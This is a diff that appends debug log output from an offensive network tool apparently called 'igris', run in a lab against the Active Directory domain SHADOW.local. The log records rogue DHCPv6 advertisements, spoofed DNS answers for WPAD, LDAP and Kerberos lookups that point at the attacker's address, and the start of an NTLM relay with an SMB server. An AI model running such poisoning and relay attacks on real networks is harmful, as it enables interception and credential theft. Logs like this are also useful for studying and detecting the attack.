@@ -21512,3 +21512,748 @@ Exiting ...
 2022-01-17 19:01:39.751 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
 2022-01-17 19:01:39.751 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
 2022-01-17 19:01:39.751 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::11cd:3852:b2df:f387 responding b'DC-Shadow.SHADOW.local.'[0m
+2022-01-19 17:00:04.698 | DEBUG    | project.network.poison.poisonselector:do_poison:174 - Starting mdns poisoning attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b
+2022-01-19 17:00:04.701 | DEBUG    | project.shell.igris:check_settable_variables_value:231 - Checking the correct value of the necessary settable variables 
+2022-01-19 17:00:04.714 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_dns:137 - Running dns poisoning in the background
+2022-01-19 17:00:04.719 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:start_dns_poisoning:133 - Starting dns poisoning...
+2022-01-19 17:00:19.371 | DEBUG    | project.network.poison.dnstakeover:do_dns_takeover:153 - Starting mdns poisoning attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b
+2022-01-19 17:00:19.371 | ERROR    | project.network.poison.dnstakeover:__checking_conditions_for_attack:77 - Error: the following arguments are required: -M/--mask
+2022-01-19 17:00:56.640 | DEBUG    | project.network.poison.dnstakeover:do_dns_takeover:153 - Starting mdns poisoning attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b
+2022-01-19 17:00:56.640 | DEBUG    | project.shell.igris:check_settable_variables_value:231 - Checking the correct value of the necessary settable variables 
+2022-01-19 17:00:56.652 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_dhcp6:123 - Running dhcp6 poisoning in the background
+2022-01-19 17:00:56.655 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:start_dhcp6_poisoning:220 - Starting dhcp6 rogue to attack shadow.local.
+2022-01-19 17:01:07.318 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__application_layer:141 - [36m(DHCP6)Capturing SOLICIT packet from fe80::11cd:3852:b2df:f387[0m
+2022-01-19 17:01:09.390 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:169 - Packet crafted: 
+2022-01-19 17:01:09.392 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:170 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2022-01-19 17:01:09.393 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:173 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2022-01-19 17:01:09.452 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__application_layer:147 - [36m(DHCP6)Capturing REQUEST packet from fe80::11cd:3852:b2df:f387[0m
+2022-01-19 17:01:11.544 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:169 - Packet crafted: 
+2022-01-19 17:01:11.546 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:170 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Reply / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2022-01-19 17:01:11.546 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:178 - [36m(DHCP6) Sending dhcp6 REPLY packet to fe80::11cd:3852:b2df:f387[0m
+2022-01-19 17:01:11.608 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__application_layer:147 - [36m(DHCP6)Capturing REQUEST packet from fe80::11cd:3852:b2df:f387[0m
+2022-01-19 17:01:13.712 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:169 - Packet crafted: 
+2022-01-19 17:01:13.713 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:170 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Reply / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2022-01-19 17:01:13.714 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:178 - [36m(DHCP6) Sending dhcp6 REPLY packet to fe80::11cd:3852:b2df:f387[0m
+2022-01-19 17:01:13.769 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__application_layer:147 - [36m(DHCP6)Capturing REQUEST packet from fe80::11cd:3852:b2df:f387[0m
+2022-01-19 17:01:15.861 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:169 - Packet crafted: 
+2022-01-19 17:01:15.862 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:170 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Reply / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2022-01-19 17:01:15.862 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:178 - [36m(DHCP6) Sending dhcp6 REPLY packet to fe80::11cd:3852:b2df:f387[0m
+2022-01-19 17:01:15.918 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__application_layer:147 - [36m(DHCP6)Capturing REQUEST packet from fe80::11cd:3852:b2df:f387[0m
+2022-01-19 17:01:17.656 | DEBUG    | project.network.mitm.ntlmrelay:do_ntlm_relay:420 - Starting ntlm relay attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2022-01-19 17:01:17.656 | DEBUG    | project.shell.igris:check_settable_variables_value:231 - Checking the correct value of the necessary settable variables 
+2022-01-19 17:01:17.688 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2022-01-19 17:01:18.027 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:169 - Packet crafted: 
+2022-01-19 17:01:18.027 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:170 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Reply / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2022-01-19 17:01:18.027 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:178 - [36m(DHCP6) Sending dhcp6 REPLY packet to fe80::11cd:3852:b2df:f387[0m
+2022-01-19 17:01:18.076 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__application_layer:147 - [36m(DHCP6)Capturing REQUEST packet from fe80::11cd:3852:b2df:f387[0m
+2022-01-19 17:01:20.147 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:169 - Packet crafted: 
+2022-01-19 17:01:20.147 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:170 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Reply / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2022-01-19 17:01:20.147 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:178 - [36m(DHCP6) Sending dhcp6 REPLY packet to fe80::11cd:3852:b2df:f387[0m
+2022-01-19 17:01:32.380 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__application_layer:141 - [36m(DHCP6)Capturing SOLICIT packet from fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:01:34.479 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:169 - Packet crafted: 
+2022-01-19 17:01:34.480 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:170 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::ad5d:a0a0:f1d:bb1d:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2022-01-19 17:01:34.480 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:173 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:01:34.515 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__application_layer:141 - [36m(DHCP6)Capturing SOLICIT packet from fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:01:34.756 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:01:34.757 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:01:34.757 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'wpad.SHADOW.local.'[0m
+2022-01-19 17:01:34.804 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:01:34.804 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:01:34.804 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'_ldap._tcp.Default-First-Site-Name._sites.dc._msdcs.SHADOW.local.'[0m
+2022-01-19 17:01:34.876 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:01:34.876 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:01:34.876 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'wpad.shadow.local.'[0m
+2022-01-19 17:01:34.915 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:01:34.916 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:01:34.916 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'_ldap._tcp.dc._msdcs.SHADOW.local.'[0m
+2022-01-19 17:01:34.948 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:01:34.948 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:01:34.948 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'_ldap._tcp.Default-First-Site-Name._sites.dc._msdcs.SHADOW.local.'[0m
+2022-01-19 17:01:34.992 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:01:34.992 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:01:34.992 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'_ldap._tcp.b05eb74f-ee57-43cd-b537-7a80ccbb0f59.domains._msdcs.SHADOW.local.'[0m
+2022-01-19 17:01:35.028 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:01:35.028 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:01:35.028 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'_ldap._tcp.dc._msdcs.SHADOW.local.'[0m
+2022-01-19 17:01:35.068 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:01:35.069 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:01:35.069 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'_ldap._tcp.b05eb74f-ee57-43cd-b537-7a80ccbb0f59.domains._msdcs.SHADOW.local.'[0m
+2022-01-19 17:01:35.581 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:01:35.581 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:01:35.581 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'dns.msftncsi.com.'[0m
+2022-01-19 17:01:36.587 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:169 - Packet crafted: 
+2022-01-19 17:01:36.587 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:170 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::ad5d:a0a0:f1d:bb1d:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2022-01-19 17:01:36.587 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:173 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:01:36.620 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__application_layer:147 - [36m(DHCP6)Capturing REQUEST packet from fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:01:37.252 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:01:37.252 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:01:37.252 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'v20.events.data.microsoft.com.'[0m
+2022-01-19 17:01:37.657 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:01:37.658 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:01:37.658 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'geo.prod.do.dsp.mp.microsoft.com.'[0m
+2022-01-19 17:01:38.707 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:169 - Packet crafted: 
+2022-01-19 17:01:38.707 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:170 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::ad5d:a0a0:f1d:bb1d:dhcpv6_client / DHCP6_Reply / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2022-01-19 17:01:38.707 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:178 - [36m(DHCP6) Sending dhcp6 REPLY packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:01:38.739 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__application_layer:141 - [36m(DHCP6)Capturing SOLICIT packet from fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:01:39.062 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:01:39.062 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:01:39.062 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'_ldap._tcp.Default-First-Site-Name._sites.dc._msdcs.SHADOW.local.'[0m
+2022-01-19 17:01:39.100 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:01:39.100 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:01:39.100 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'_ldap._tcp.dc._msdcs.SHADOW.local.'[0m
+2022-01-19 17:01:39.140 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:01:39.140 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:01:39.140 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'_ldap._tcp.b05eb74f-ee57-43cd-b537-7a80ccbb0f59.domains._msdcs.SHADOW.local.'[0m
+2022-01-19 17:01:39.800 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:01:39.801 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:01:39.801 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'PC-Iron.SHADOW.local.'[0m
+2022-01-19 17:01:39.836 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:01:39.836 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:01:39.836 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'SHADOW.local.'[0m
+2022-01-19 17:01:39.868 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:01:39.868 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:01:39.868 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'local.'[0m
+2022-01-19 17:01:40.807 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:169 - Packet crafted: 
+2022-01-19 17:01:40.807 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:170 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::ad5d:a0a0:f1d:bb1d:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2022-01-19 17:01:40.807 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:173 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:01:40.847 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__application_layer:141 - [36m(DHCP6)Capturing SOLICIT packet from fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:01:41.292 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:01:41.293 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:01:41.293 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'_kerberos._tcp.Default-First-Site-Name._sites.dc._msdcs.SHADOW.local.'[0m
+2022-01-19 17:01:41.328 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:01:41.328 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:01:41.328 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'_kerberos._tcp.dc._msdcs.SHADOW.local.'[0m
+2022-01-19 17:01:42.277 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:01:42.277 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:01:42.278 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'_ldap._tcp.Default-First-Site-Name._sites.dc._msdcs.SHADOW.local.'[0m
+2022-01-19 17:01:42.332 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:01:42.332 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:01:42.332 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'_ldap._tcp.dc._msdcs.SHADOW.local.'[0m
+2022-01-19 17:01:42.363 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:01:42.364 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:01:42.364 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'_ldap._tcp.Default-First-Site-Name._sites.dc._msdcs.SHADOW.local.'[0m
+2022-01-19 17:01:42.412 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:01:42.412 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:01:42.412 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'_ldap._tcp.b05eb74f-ee57-43cd-b537-7a80ccbb0f59.domains._msdcs.SHADOW.local.'[0m
+2022-01-19 17:01:42.456 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:01:42.456 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:01:42.456 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'_ldap._tcp.dc._msdcs.SHADOW.local.'[0m
+2022-01-19 17:01:42.508 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:01:42.508 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:01:42.508 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'_ldap._tcp.b05eb74f-ee57-43cd-b537-7a80ccbb0f59.domains._msdcs.SHADOW.local.'[0m
+2022-01-19 17:01:42.839 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:01:42.839 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:01:42.839 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'wdcp.microsoft.com.'[0m
+2022-01-19 17:01:42.919 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:169 - Packet crafted: 
+2022-01-19 17:01:42.919 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:170 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::ad5d:a0a0:f1d:bb1d:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2022-01-19 17:01:42.920 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:173 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:01:42.956 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__application_layer:141 - [36m(DHCP6)Capturing SOLICIT packet from fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:01:43.210 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:01:43.211 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:01:43.211 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'_ldap._tcp.Default-First-Site-Name._sites.SHADOW.local.'[0m
+2022-01-19 17:01:43.244 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:01:43.244 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:01:43.244 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'_ldap._tcp.SHADOW.local.'[0m
+2022-01-19 17:01:43.299 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:01:43.299 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:01:43.299 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'_ldap._tcp.Default-First-Site-Name._sites.SHADOW.local.'[0m
+2022-01-19 17:01:43.332 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:01:43.332 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
